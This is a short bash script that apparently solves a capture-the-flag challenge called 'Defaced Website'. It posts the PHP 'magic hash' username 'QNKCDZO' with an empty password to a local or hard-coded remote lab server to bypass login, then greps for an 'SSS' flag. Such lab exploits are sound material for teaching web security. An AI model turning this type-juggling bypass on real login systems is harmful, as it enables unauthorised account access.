#!/bin/bash

PORT=8005

if [[ $1 == "local" ]]
then
    URL='http://127.0.0.1:'$PORT
elif [[ $1 == "remote" ]] && [[ -z $2 ]]
then
    URL='http://141.85.224.105:'$PORT
elif [[ $# -ne 2 ]]
then
    echo "Usage:"
    echo $0" {local,remote}"
    echo "or"
    echo $0" <ip> <port>"
    exit 1
else
    URL=$1':'$2
fi


# Defaced Website

curl $URL -s -H 'Content-Type: application/x-www-form-urlencoded' --data-raw 'username=QNKCDZO&password=&submit=Login' | grep SSS | xargs
